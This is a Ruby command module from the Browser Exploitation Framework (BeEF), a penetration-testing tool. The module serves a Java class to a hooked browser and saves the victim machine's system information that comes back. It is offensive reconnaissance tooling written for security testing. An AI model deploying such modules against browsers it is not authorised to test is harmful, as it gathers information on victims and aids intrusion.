#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - https://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Get_system_info_java < BeEF::Core::Command
  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/host/get_system_info_java/getSystemInfo.class', '/getSystemInfo', 'class')
  end

  def post_execute
    content = {}
    content['result'] = @datastore['system_info'] unless @datastore['system_info'].nil?
    content['fail'] = 'No data was returned.' if content.empty?
    save content
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/getSystemInfo.class')
  end
end
